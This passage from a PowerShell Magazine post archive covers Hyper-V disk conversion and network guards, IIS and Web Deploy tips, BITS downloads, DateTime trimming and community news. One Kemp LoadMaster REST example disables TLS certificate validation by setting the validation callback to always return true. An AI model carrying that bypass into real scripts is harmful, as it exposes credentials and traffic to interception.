[Parameter(Position=0,Mandatory,ValueFromPipelineByPropertyName,ValueFromPipeline,ParameterSetName='name')] [Alias('VMName')] [System.String[]]$Name, [Parameter(Position=0,Mandatory,ValueFromPipeline,ParameterSetName='inputObject')] [Microsoft.HyperV.PowerShell.VirtualMachine[]]$InputObject, [Parameter(Position=0,Mandatory,ValueFromPipelineByPropertyName)] [Alias('cn')] [string]$ComputerName=$env:COMPUTERNAME, [switch]$DeleteSource, [switch]$Force, [switch]$StartVM ) begin { $bp = $PSCmdlet.MyInvocation.BoundParameters $ds = [bool]$bp['DeleteSource'] $vb = [bool]$bp['Verbose'] $cfrm = [bool]$bp['Confirm'] $frc = [bool]$bp['Force'] $wi = [bool]$bp['WhatIf'] } process { try { $vms = if($PSCmdlet.ParameterSetName -eq 'name') { Get-VM -Name $Name -ComputerName $ComputerName } else { $InputObject } foreach($vm in $vms) { $vhd = $vm.HardDrives | Where-Object { $_.Path -like '*.vhd'} if(!$vhd) { Write-Warning \u0026quot;No VHD disks detected on VM: $($vm.Name)\u0026quot; continue } else { Write-Verbose \u0026quot;VHD disks were detected on VM: $($vm.Name)\u0026quot; } if($vm.State -eq 'Running') { Write-Verbose \u0026quot;Shutting down $($vm.Name)\u0026quot; Stop-VM $vm.Name -ComputerName $ComputerName -Confirm:$cfrm -Force:$frc -ErrorAction Stop -WhatIf:$wi } $vhd | ForEach-Object{ $drv = $_ | Select-Object * $vhdx = [System.IO.Path]::ChangeExtension($_.Path,'vhdx') Convert-VHD –Path $_.Path –DestinationPath $vhdx -ComputerName $ComputerName -DeleteSource:$ds -Confirm:$cfrm -Verbose:$vb -WhatIf:$wi Set-VHD –Path $vhdx -PhysicalSectorSizeBytes 4kb -ComputerName $ComputerName -Confirm:$cfrm -Verbose:$vb -WhatIf:$wi Remove-VMHardDiskDrive $_ -WhatIf:$wi -Verbose:$vb | Out-Null Add-VMHardDiskDrive -VMName $vm.Name -ComputerName $ComputerName -Path $vhdx -ControllerType $drv.ControllerType -ControllerLocation $drv.ControllerLocation -ControllerNumber $drv.ControllerNumber -Confirm:$cfrm -Verbose:$vb -WhatIf:$wi } if($StartVM) { Start-VM $vm.Name -ComputerName $ComputerName -Verbose:$vb -WhatIf:$wi } } } catch { Write-Error $_ } } }  The variables in the Begin block are used to determine the values of switches regardless if they were present on the command line or not. The values are then passed to the corresponding parameters of each command used inside the function.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/25/converting-hyper-v-virtual-machine-disks-from-vhd-to-vhdx/","tags":["How To","Hyper-V"],"title":"Converting Hyper-V virtual machine disks from VHD to VHDX"},{"categories":["Hyper-V","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nUsing the Add-VMNetworkAdapterAcl cmdlet we can create ACLs (firewall-like rule) that applies to the traffic through a virtual machine network adapter. We can use it to allow or block traffic to or from specific sources by using IP addresses (including a range of addresses) or MAC addresses.\nACL rules apply to Hyper-V switch ports and currently can only be set using PowerShell. They control whether a packet is allowed or denied on the way into or out of the VM. Multiple port ACLs can be configure for a Hyper-V switch port.\nThe following command will deny inbound and outbound traffic from VM1 to the remote IP address 192.168.0.1\nAdd-VMNetworkAdapterAcl –VMName VM1 -RemoteIPAddress 192.168.0.1 -Direction Both -Action Deny To remove the rule:\nRemove-VMNetworkAdapterAcl -VMName VM1 -RemoteIPAddress 192.168.0.1 -Action Deny -Direction Both ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/24/pstip-controlling-traffic-of-a-vm-network-adapter-in-hyper-v/","tags":["Hyper-V","Tips and Tricks"],"title":"#PSTip Controlling traffic of a VM network adapter in Hyper-V"},{"categories":["Community"],"contents":"My name is Fredrik Wall and I’m a co-founder/co-leader of the PowerShell User Group Sweden. We have almost 530 members in our Facebook group and some more members who do not want to be on Facebook. \nThe user group with its current name will turn 2 years on March 3 as a group on Facebook. On the 3 of March 2012, Niklas Goude, Niklas Åkerlund, and I started the PowerShell User Group Sweden on Facebook. That was a restart of the old user group “Scandinavia PowerShell User Group” that Niklas Goude, Magnus Lindegren, and I started sometimes before Microsoft TechDays in 2009.\nThat group was intended to be a PowerShell group for Scandinavia but was more or less a Swedish group and back then the group was small without a real platform to reach out to new members. So we decided to restart the group in 2012 as a Swedish group with Facebook as the platform to gather our members. It’s easy to handle and easy for our members to join.\nIn 2012 we were about 200 members and we had one meeting in Stockholm where the Microsoft Scripting Guy (Ed Wilson) visited us and talked about PowerShell. Last year we had 3 events:\n PowerShell Community Day 2013 in Stockholm (May 23)  With 5 speakers and 6 sessions Speakers:  Niklas Åkerlund, Niklas Goude, Daniel Sörlöv, Fredrik Wall, Fredrik Jonsson, and Johan Åkerström        User Group Meeting in Stockholm (October 24)\n With 6 speakers and 6 sessions Speakers:  Pär Hultman, Rikard Rönnkvist, Jonas Pettersson, Daniel Sörlöv, Daniel Grenemark and Johan Åkerström      User Group Meeting in Gothenburg (October 25)\n With 2 speakers and 2 sessions Speakers:  Niklas Goude, Johan Åkerström      This year we had 2 events. The second one has just finished this weekend.\n  User Group Meeting in Stockholm (February 6)\n With 4 speakers and 4 sessions Speakers:  Simon Wåhlin, Niklas Åkerlund, Daniel Sörlöv, and Niklas Goude      PowerShell Geek Weekend 2014 #1 (February 21-23)\n  Hosts/Moderators:\n Fredrik Wall, Johan Åkerström, and Henrik Toft    Lots of speakers and lots of PowerShell coding. All presentations and demo code will be posted at GitHub very soon.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/24/the-story-of-powershell-user-group-sweden/","tags":["Community"],"title":"The story of PowerShell User Group Sweden"},{"categories":["Hyper-V","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nSimilarly to the Hyper-V security feature discussed here, Hyper-V can also protect the environment from VMs pretending to act as Routers.\nRouter Guard allows you to specify whether the router advertisement and redirection messages from unauthorized VMs should be dropped. A malicious VM can send router advertisement messages or respond to another VM’s router solicitation messages to claim itself as the router.\nSet the RouterGuard parameter to_ “On” _to_ drop router messages sent from a VM. _Set it to_ “Off” _to allow the messages.\nSet-VMNetworkAdapter -VMName VM1 -Name Public -RouterGuard On  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/22/pstip-how-to-prevent-a-vm-from-becoming-a-router/","tags":["Hyper-V","Tips and Tricks"],"title":"#PSTip How to prevent a VM from becoming a Router"},{"categories":["Tips and Tricks","Hyper-V"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nIn a DHCP environment, it is possible for a rogue DHCP server to respond to client DHCP requests and provide incorrect address and configuration information. A rogue DHCP server could be used to redirect traffic for malicious purposes.\nHyper-V Virtual Switches in Windows Server 2012 has a new security feature called DHCP Guard. It drops DHCP server messages from unauthorized VMs pretending to be DHCP server. DHCP Guard allows you to specify whether DHCP server messages coming from a VM should be dropped.\nThe following command prevents a VM from becoming a rogue DHCP server by turning DHCPGuard “On”. To turn it off, set DHCPGuard to “Off”.\nSet-VMNetworkAdapter -VMName VM1 -DhcpGuard On   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/21/pstip-how-to-prevent-rouge-dhcp-servers-in-hyper-v/","tags":["Tips and Tricks","Hyper-V"],"title":"#PSTip How to prevent rogue DHCP servers in Hyper-V"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nUsing the Get-Counter cmdlet and the Web Service Current Connections performance counter, you can get the amount of current connections to an IIS server or to one of its web sites. This counter is extremely useful in load balanced environments where you want to make sure that connections are evenly balanced across a group of IIS servers.\nThe following command gets the total number of connections for the server:\nGet-Counter -Counter 'web service(_total)\\current connections' -ComputerName server1 This example gets the number of connections for a specified website of three front end servers of a SharePoint farm:\nGet-Counter -Counter 'web service(sharepoint - myportal80)\\current connections'-ComputerName fe1,fe2,fe3 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/20/pstip-how-to-get-the-number-of-iis-current-client-connections/","tags":["Tips and Tricks"],"title":"#PSTip How to get the number of IIS current client connections"},{"categories":["News"],"contents":"You are reading the 500th post on PowerShell Magazine. Wow, what a journey! We had our share of ups and downs but kept this going for a good reason. And, that reason is you–the PowerShell community. This is indeed a great journey.\n “I alone cannot change the world, but I can cast a stone across the waters to create many ripples.” ― Mother Teresa\n PowerShell Magazine was started back in 2011 as a platform to bring the Windows PowerShell community together to help each other in learning and sharing knowledge. To me, we have been really successful in that. So far, we featured 59 authors from this enthusiastic and energetic community. We published articles that are quoted at many places. We have had more than a million visits so far and counting. On our best days, we have close to 5K visits.\nSome of our best posts received close to or more than 20K views. Here are the top 5!\n   5 Essential PowerShell Skills for Exchange Server Administrators     Provisioning and Licensing Office 365 Accounts with PowerShell   Windows PowerShell 3.0 and Server Manager Quick Reference Guides   Managing Group Policy with PowerShell   Creating and configuring a SharePoint 2013 search service application    Our social media outreach has been good too. We have close to 3K followers on Twitter and more than 1400 friends liked us on Facebook.\nIf we have to improve one thing, that is the post frequency. We have had a few months when we published almost every day. This is something we have to do continuously. We have the most active PowerShell tips series but that alone does not help. PowerShell is an ocean and I don’t think we have even covered a small portion of it.\nWe have certainly slowed down a bit but we are picking up steam which means we have a good set of articles already in the queue waiting to get published. If you are interested in joining us on this journey, please feel free to contact us.\nI am eagerly waiting for our 1000th post and 2 million visitors! I am sure that day is not too far away. We want to take this opportunity to thank each one of you for being with us and supporting us. Thanks to our sponsors for helping us in this journey.\nA big thank you from the editorial team!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/19/another-important-milestone-powershell-magazine-has-published-500-posts/","tags":["News"],"title":"Another important milestone! PowerShell Magazine has published 500 posts!"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWeb Deploy v3 introduced an automatic server-side backup feature for IIS 7 and above. When automatic backups are configured on the server and a user publishes to his site using Web Deploy, it will first take a backup of the live site and store it on the server before committing any changes to the site.\nThere is no UI to enable this feature. To enable automatic Web Deploy backups, run the following command:\nImport-Module WebAdministration Set-WebConfiguration -PSPath MACHINE/WEBROOT/APPHOST -Filter system.webServer/wdeploy/backup -Value @{turnedOn=$true; enabled=$true}  The default location of backups on the server is set to _“{sitePathParent}{siteName}snapshots”, where “{sitePathParent}” and “{siteName}” are path replacement variables for which are determined at run-time. sitePathParent is the physical file path of the parent of your sites content and siteName is the name of your site. In the case of the “Default Web Site” website, the location will resolve to “C:\\inetpub\\Default Web Site_snapshots”.\nHere’s a sample output of that location. Backups are saved as Zip files:\nPS\u0026gt; Get-ChildItem \"C:\\inetpub\\Default Web Site_snapshots\" -Name msdeploy_2014_01_22_10_57_58.zip msdeploy_2014_01_23_10_27_25.zip msdeploy_2014_01_28_13_40_26.zip msdeploy_2014_02_10_18_21_11.zip  By default, only the last 4 backups are stored on the server in the above location. When the maximum number of backups has been created, the oldest backup will be deleted. To change the value, run:\nSet-WebConfiguration -PSPath MACHINE/WEBROOT/APPHOST -Filter system.webServer/wdeploy/backup -Value @{numberOfBackups=6}  Note that Web Deploy doesn’t ship with IIS and requires a separate installation.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/19/pstip-how-to-enable-web-deploy-automatic-backups-using-powershell/","tags":["Tips and Tricks"],"title":"#PSTip How to enable Web Deploy automatic backups using PowerShell"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nComparing two System.DateTime objects in PowerShell is really easy. All you need to do is:\nPS\u0026gt; $date1 = $date2 = Get-Date PS\u0026gt; $date1 -eq $date2 True  When the two objects are compared their Ticks properties are in fact compared:\nPS\u0026gt; $date1.Ticks -eq $date2.Ticks True  Ticks are the most precise way to represent a DateTime; there are 10,000 ticks in one millisecond. That is 10 million ticks in one second. In my current project I needed the comparisons to be a little less precise and consider DateTime objects equal even if they were a few milliseconds apart. To do that I decided to trim the DateTime objects by removing any excess milliseconds and ticks.\nDoing that in PowerShell 3.0 is pretty easy:\nPS\u0026gt; $date = Get-Date PS\u0026gt; $date.Ticks 635276593924675678 PS\u0026gt; Get-Date -Date ($date) -Millisecond 0 | Select -ExpandProperty Ticks 635276593260000000 This will take the current date and set its Millisecond and any extra Ticks to 0.\nIn PowerShell 2.0 the conversion is a little bit more challenging because there is no Millisecond parameter there. And you can’t simply use the AddMilliseconds method to remove the extra milliseconds, because that won’t affect the extra ticks:\nPS\u0026gt; $date.AddMilliseconds(- $date.Millisecond) | Select -ExpandProperty Ticks 635276593920005678  Another workaround has to be used:\nPS\u0026gt; [datetime]($Date.Ticks - $date.Ticks % 10000000) | Select -ExpandProperty Ticks 635276593260000000  I needed to make the script compatible with PowerShell 2.0 and I also wanted it to be readable. So I ended up writing function to do it, and more:\nfunction Trim-Date { param ( [Parameter(Mandatory = $true, ValueFromPipeline = $true)] [DateTime]$Date, [ValidateSet('Tick','Millisecond','Second','Minute','Hour','Day')] [String]$Precision = 'Second' ) process { if ($Precision -eq 'Tick') { return $Date } $TickCount = Switch ($Precision) { 'Millisecond' { 10000; break } 'Second' { ( New-TimeSpan -Seconds 1 ).ticks; break } 'Minute' { ( New-TimeSpan -Minutes 1 ).ticks; break } 'Hour' { ( New-TimeSpan -Hours 1 ).ticks; break } 'Day' { ( New-TimeSpan -Days 1 ).ticks; break } } $Result = $Date.Ticks - ( $Date.Ticks % $TickCount ) [DateTime]$Result } }  This function takes two parameters: Date and Precision. The Date is the DateTime object to be trimmed and the Precision specifies what is the biggest unit to be kept. If, for example, Hour precision is specified, minutes, seconds, millisecond and extra ticks are set to 0. In the following example the default Second precision is used so just milliseconds and any extra ticks are set to zero.\nPS\u0026gt; $date | Trim-Date -Precision Second | Select -ExpandProperty Ticks 635276593260000000  The function also turned out to be great for checking if two timestamps were created during the same day:\nPS\u0026gt; ([datetime]\"2013/12/10 12:14:36\" | Trim-Date -Precision Day) -eq ([datetime]\"2013/12/10 18:10:21\" | Trim-Date -Precision Day) True  or creating precise plans for the next day:\nPS\u0026gt; (Get-Date -Hour 11).AddDays(1) | Trim-Date -Precision Hour Tuesday, February 11, 2014 11:00:00 AM   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/18/pstip-comparing-datetime-with-a-given-precision/","tags":["Tips and Tricks"],"title":"#PSTip Comparing DateTime with a given precision"},{"categories":["Hyper-V","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nIn a physical switch environment, all traffic from selected ports can be duplicated and copied to a mirror port for capture and analysis, such as network diagnostic of a VM boot process or any network-related issues.\nStarting in Windows Server 2012, port mirroring can be enabled on virtual switches as well. We can designate a vSwitch port as a monitoring port, and direct the vSwitch traffic going through this port to a specific VM.\nThe configuration is twofold–changes are needed on both, the source and destination VMs. This can be set under the Advanced Features page of the VMs’ network card.\nThe following commands sets port mirroring on two VMs using the Set-VMNetworkAdapter. VM1 acts as the source VM, every packet sent or received by VM1 (on all all virtual network adapters) will be mirrored to VM2 virtual network card named Public . When you open a network monitor application on VM2, you will see captured traffic from both VMs.\nSet-VMNetworkAdapter -VMName VM1 -PortMirroring Source Set-VMNetworkAdapter -VMName VM2 -Name Public -PortMirroring Destination  Note that you can set multiple VMs as source machines and all their traffic will be copied to the destination VM.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/17/pstip-vm-port-mirroring-in-hyper-v/","tags":["Tips and Tricks","Hyper-V"],"title":"#PSTip VM Port mirroring in Hyper-V"},{"categories":["News"],"contents":"PowerShell Bangalore User Group (PSBUG) and Bangalore IT Pro are happy to announce the first ever PowerShell Saturday event in India. We are hosting this free event at the Microsoft Technology Center (MTC) in Bangalore. The theme of the event is to use product specific PowerShell scripts to explain the language concepts, tips, and tricks. So, whether you are beginner or an expert, this event is for you. Please note that this is an in-person event.\nRegistrations\nhttp://pssatindia.eventbrite.com\nVenue\nKrishna Room, 3rd Floor, Block B\nMicrosoft MTC, Signature Building,\nDomlur, Bangalore\nEvent Sponsors\nKemp Technologies\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/15/announcing-powershell-saturday-india/","tags":["News"],"title":"Announcing PowerShell Saturday India"},{"categories":["PowerShell DSC"],"contents":"Around Christmas time last year, PowerShell team released the wave 1 of DSC resource kit. This had good number of custom resources to manage Hyper-V virtual machines, IIS websites, and so on. The wave 2 of custom DSC resources just got released. This release too has some very interesting DSC resources. For example, this release includes SQL DSC resources to install and manage SQL servers, Active Directory-related resources and some improvements and bug fixes of the previously released resources.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/09/desired-state-configuration-dsc-resource-kit-wave-2/","tags":["PowerShell DSC"],"title":"Desired State Configuration (DSC) Resource Kit Wave-2"},{"categories":["Tips and Tricks"],"contents":"Today, most of the web servers that provide downloads enable resumable downloads. Of course, there are still sites that don’t offer resumable downloads. When using BITS transfer cmdlets, we can suspend and resume downloads using the Suspend-BitsTransfer and Resume-BitsTransfer cmdlets. However, if the web server does not support resumable downloads, trying to resume a download using BITS transfer cmdlets will have no impact.\nThis is where we can inspect the HTTP response headers to test if a server supports resuming downloads. The HTTP header that tells us this information is “Accept-Ranges“. The value of this header will be set to none if the server does not supporting resuming downloads. The following function helps us in testing for resumable downloads.\nFunction Test-ResumableDownload { param ( [String]$url ) $request = [System.Net.WebRequest]::Create($url) $request.Method = \"GET\" $result = $request.GetResponse() $result.Headers[\"Accept-Ranges\"] -ne \"none\" }  We can use this technique as a prerequisite before starting a download using the Start-BitsTransfer cmdlet to let the user know whether a download can be resumed or not.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/07/pstip-test-if-a-download-can-be-suspended-and-resumed/","tags":["Tips and Tricks"],"title":"#PSTip Test if a download can be suspended and resumed"},{"categories":["Tips and Tricks"],"contents":"Have you ever wondered how you can set the keyboard layout using PowerShell? I recently came across a situation where a set of virtual machines I deployed from a template had a different keyboard layout than what I intend to use. Fortunately, starting with Windows Server 2012 and Windows 8, there is a built-in cmdlet to do this.\nThe Set-WinUserLanguageList cmdlet can be used to set the keyboard layout. This cmdlet is available in the International module.\nSet-WinUserLanguageList -LanguageList en-US  The Get-WinUserLanguageList cmdlet gets the list of languages for the current user.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/06/pstip-setting-keyboard-layout-in-windows-8-and-server-2012/","tags":["Tips and Tricks"],"title":"#PSTip Setting keyboard layout in Windows 8 and Server 2012"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nThere was a quick status this morning on Facebook where my friend Deepak Dhami a.k.a Dexter posted a quick snippet that read something like this:\nI looked at this and thought, there is a better PowerShell way! 🙂\nWe both started working out our solutions and this is what I came up with:\n$uri = \u0026quot;http://download.microsoft.com/download/D/0/F/D0F564A3-6734-470B-9772-AC38B3B6D8C2/dotNetFx45_Full_x86_x64.exe\u0026quot; $job = Start-BitsTransfer -Source $uri -Destination C:\\Downloads -Asynchronous While ($job.JobState -eq \u0026quot;Transferring\u0026quot;) { Sleep -Seconds 1 } If ($job.InternalErrorCode -ne 0) { (\u0026quot;Error downloading the file {0}\u0026quot; -f $job.InternalErrorCode) | Out-File C:\\downloads\\downloaderror.log } else { #Do something here #Stop-Computer -Force } This is what Deepak worked out:\n$job = Start-Job -Name DownloadJob -ScriptBlock { Start-BitsTransfer -Source \u0026quot;http://cdimage.kali.org/kali-latest/amd64/kali-linux-1.0.6-amd64.iso\u0026quot; -Destination \u0026quot;C:\\temp\\KaliLinux.iso\u0026quot; -DisplayName \u0026quot;Download\u0026quot; -Asynchronous } $action = { if ($job.State -eq \u0026quot;completed\u0026quot;) { if ((Get-BitsTransfer -Name Download).JobState -eq \u0026quot;Transferred\u0026quot;) { Write-host -ForegroundColor Gray \u0026quot;Download Complete ...Halting Machine\u0026quot; Stop-Computer -Force } } } Register-ObjectEvent -InputObject $job -EventName StateChanged -Action $action Now, both are perfectly valid solutions. If I were to use the eventing way of doing this, I’d use the Start-Job cmdlet to create a background job. The BITS job generated by using -Asynchronous switch has no events that we can subscribe to. So, I had to fall back on using a While loop.\nHow do you do this?\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/01/17/pstip-using-start-bitstransfer-and-waiting-for-download-to-complete/","tags":["Tips and Tricks"],"title":"#PSTip Using Start-BitsTransfer and waiting for download to complete"},{"categories":["How To","Kemp"],"contents":"If you are an application or a network administrator, you would have certainly heard about or even used load balancers. Load balancers are shipped either as hardware or virtual appliances based on the size of the deployment behind them. Today, almost every load balancer vendor offers both varieties. Kemp Technologies, our technology partner and a new entrant in Gartner magic quadrant for Application Delivery Controllers (ADC) offers both hardware and virtual appliances.\nWhile Kemp load balancers have a very intuitive and easy to use web-based user interface for managing load balancing configuration, Kemp also offers a RESTFul API to script the Kemp load balancer management – whether it is a hardware or a virtual appliance. One thing to remember is that the REST API interfaces need to be enabled in Kemp Web User Interface (WUI). By default, they are disabled.\nNow, with PowerShell, it is very easy to work with REST API. Kemp structured its API in a very easy way. The general syntax for any REST API method in KEMP REST interfaces is something like this:\nhttps:///access/?=value\u0026amp;=value\nNote that the Invoke-RestMethod and the Invoke-WebRequest have issues with accessing REST API over HTTPS and basic authorization. You will find, over many forums, that there are workarounds. For the purpose of this post, I will use a simple .NET HttpWebRequest.\nSo, for getting the maximum cache size setting on the KEMP LoadMaster, we can simply call https://\u0026lt;LoadMaster IPAddress\u0026gt;/access/get?param=cachesize\nThis API returns XML output which can be easily parsed using PowerShell.\nNow, let us look at some PowerShell code that can be used to access the cache size setting on the LoadMaster appliance.\n$uri = \u0026quot;https://192.168.1.3/access/get?param=cachesize\u0026quot; $credential = Get-Credential -UserName bal [System.Net.ServicePointManager]::Expect100Continue = $true [System.Net.ServicePointManager]::MaxServicePointIdleTime = 10000 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} $request = [System.Net.HttpWebRequest]::Create($uri) $request.Credentials = $Credential $response = $request.GetResponse() $stream = $response.GetResponseStream() if($response.contenttype -eq \u0026quot;text/xml\u0026quot;) { $Encoding = [System.Text.Encoding]::GetEncoding(\u0026quot;utf-8\u0026quot;) $reader = New-Object system.io.StreamReader($stream, $Encoding) $result = $reader.ReadToEnd() if ($result.response.success) { if ([string]::IsNullOrEmpty($result.response.success.data)) { Write-Output $result.response.code } else { Write-output $result.response.success.data } } else { Write-Output $result.response } } As you see, we see the cache size setting on my LoadMaster VM. Now, the above code can be put into a simple and re-usable function to access different methods provided in the Kemp REST API.\nIf you want to explore more on how to use Kemp REST API and what you can do with it, Kemp provides a trial license of LoadMaster as a VM. This is available for various hypervisors and VMware Workstation too. Go ahead and give it a try.\nHere is a teaser: In our upcoming posts, we will show you how easy it is to manage a Kemp LoadMaster using better ways than writing the functions and dealing with the REST API youself. Stay tuned.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/01/16/managing-kemp-loadmaster-using-rest-api-and-powershell/","tags":["How To","Kemp"],"title":"Managing Kemp LoadMaster using REST API and PowerShell"},{"categories":["News"],"contents":"Johan Akerstrom – PowerShell expert from Sweden – released a PowerShell module that can be used to start a PowerShell-based web server. He preferred to call it a PowerShell Information Server (PSIS). Although, I am not really sure about the name given to it, I completely love the concept and work he did.\nThis module is available on Github. It is very easy to use and work with.\nInvoke-PSIS -URL \"http://*:8087/\" -AuthenticationSchemes negotiate -ProcessRequest { Write-Verbose $request.RequestBody Get-Service $request.RequestObject.ServiceName } -Verbose -Impersonate  This gets the web server started. The -ProcessRequest is what gets executed when a request arrives at the web server. So, in my example, I am just getting the service information.\nWe can call the end point we just started using the Invoke-RestMethod cmdlet.\n$data = [pscustomobject]@{ ServiceName = \"winmgmt\" } $postData = $data | ConvertTo-Json Invoke-RestMethod -Method post -Uri 'http://localhost:8087/json' -UseDefaultCredentials -Body $postData | ConvertTo-Json  I already have a list of things I want to try. Go ahead and try the module and leave your feedback for Johan.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/01/13/announcing-powershell-information-server-psis/","tags":["News"],"title":"Announcing PowerShell Information Server (PSIS)"},{"categories":["Tips and Tricks"],"contents":"If you have read my earlier post on the Hyper-V Copy-VMFile cmdlet, I was checking for the version of integration components (IC) installed in the virtual machines. I wanted to verify if the IC version is at a minimum supported level or not. If you look at any version number, it usually has four different parts – major, minor, build, and release numbers.\nThe traditional way of checking for version numbers is to verify if all four version numbers match or not. This can sometimes be complex and error prone. A more easy and efficient way to do that is using System.Version .NET class. This is available as [Version] type accelerator in PowerShell.\nPS\u0026gt; [Version]\u0026quot;6.3.9421.0\u0026quot; Major Minor Build Revision ----- ----- ----- -------- 6 3 9421 0 The [Version] type accelerator automatically converts the string into a System.Version object. It is then easy to perform the required comparisons using the PowerShell comparison operators. This class also has several overloaded methods to check version numbers that do not necessarily have all four components in the a.b.c.d version format.\nPS\u0026gt; $PSVersionTable.BuildVersion -eq [Version]\u0026quot;6.3.9423.0\u0026quot; False PS\u0026gt; $PSVersionTable.BuildVersion -eq [Version]\u0026quot;6.3.9421.0\u0026quot; True PS\u0026gt; $PSVersionTable.BuildVersion -ge [Version]\u0026quot;6.3.9421.0\u0026quot; True PS\u0026gt; $PSVersionTable.BuildVersion -le [Version]\u0026quot;6.3.942.0\u0026quot; False PS\u0026gt; $PSVersionTable.BuildVersion -le [Version]\u0026quot;6.3.9942.0\u0026quot; True PS\u0026gt; $PSVersionTable.BuildVersion -ne [Version]\u0026quot;6.3.9942.0\u0026quot; True ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/01/03/pstip-validating-version-numbers-without-regex/","tags":["Tips and Tricks"],"title":"#PSTip Validating version numbers without RegEx"},{"categories":["Learning PowerShell"],"contents":"At present, Windows PowerShell is in version 4.0. It came a long way since its initial release back in 2006. It is today called a distributed automation engine, command-line shell, and scripting language. I started looking at PowerShell in the “Monad” days–that is during the beta release of Windows Server 2008. It looked like an alien language to me in the beginning. I was very comfortable dealing with VBScripts and JScripts in those days and never wanted a different scripting language. But, PowerShell’s introduced a complete paradigm shift. For me, it changed the way I looked at automation. It gave me seamless access to .NET and Win32 native APIs. As the product matured, features such as remoting, jobs, workflows and desired state configuration increased the adoption.\nTo understand the vision and the goals behind PowerShell, I encourage you all to read Jeffrey Snover’s Monad Manifesto. If we look back, PowerShell team implemented the vision described in the manifesto release after release. Windows PowerShell is a major part of Microsoft’s Common Engineering Criteria (CEC). Today, PowerShell is closer to the vision of becoming the de-facto standard for management of the cloud. Almost every Microsoft server product has been provided with a PowerShell support. Starting with Windows Server 2012, most of the graphical interfaces use PowerShell behind the scenes.\nMany industry big-wigs have realized the potential of PowerShell. We, today, have PowerShell support for all major hypervisor and cloud products. Many of the server, storage, and networking hardware vendors have enabled PowerShell management interfaces for their products. Microsoft is working closely with industry standard bodies to enable standards-based management. Open Management Infrastructure (OMI) is a great example in this space. PowerShell is a critical player in the overall management strategy for any IT organization. I strongly believe in this and I am not alone. An entire community got built around PowerShell. Today, there are 60 MVPs in PowerShell community and many more PowerShell experts.\nAs you see here, the interest in Windows PowerShell has been rapidly growing since the early release. Also, you can see that downward trend for VBScript and JScript. Back in 2011, we started PowerShell Magazine as a community initiative. We got around 60+ authors contributing to this community project today. Together, we published over 480 articles to date. We have seen a steep rise in readership since we launched and that is just another proof that PowerShell adoption is on the rise.\nIf you are an IT administrator, I suggest that you employ PowerShell for IT automation in your organization. I wouldn’t say that PowerShell is critical for retaining your job but it is critical for progressing in your career.\nAre you still procrastinating about learning PowerShell? If you have just started learning Powershell, this article might help you focus on what you need to learn.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/12/30/are-you-still-thinking-about-getting-started-with-powershell/","tags":["Learning PowerShell"],"title":"Are you still thinking about getting started with PowerShell?"},{"categories":["PowerShell DSC"],"contents":"Are you looking at writing your own DSC resources? Have you been following our DSC articles? DSC is the exciting new feature in Windows PowerShell 4.0. To add to this excitement, PowerShell team has a holiday gift for all of us. DSC Resource Kit Wave-1! 🙂\nThis resource kit has a bunch of custom DSC resources. You may or may not use all of them but looking at the source is a great way of learning how to write your own DSC resources.\nYou can download these custom resources from TechNet script gallery.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/12/27/desired-state-configuration-dsc-resource-kit-wave-1/","tags":["PowerShell DSC"],"title":"Desired State Configuration (DSC) Resource Kit Wave-1"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nIn the previous article Matt used lambda functions to simplify data manipulation . In this tip I want to show you a way of using functions as methods by extending the System.Array class.\nBeginning in Windows PowerShell 3.0 we can use the Update-TypeData to update types with new type data. In previous versions of PowerShell this operation required writing a ps1xml file (lots of XML to deal with). Here’s an example that adds a _‘map’ script _method to Array objects :\nUpdate-TypeData -Force -MemberType ScriptMethod -MemberName map -TypeName System.Array -Value { param([object]$o) if($o -is [int]) { $this | foreach {$_ * $o} } } @(1..5).map(2) 2 4 6 8 10 One caveat of the new added method is its signature. When viewed using the Get-Member cmdlet we can see that the method doesn’t accept any arguments though the script block used to extend the type is using a param block with one parameter ($object).\nPS\u0026gt; Get-Member -InputObject @(1..5) -MemberType ScriptMethod TypeName: System.Object[] Name MemberType Definition ---- ---------- ---------- map ScriptMethod System.Object map(); In the same manner , we can use 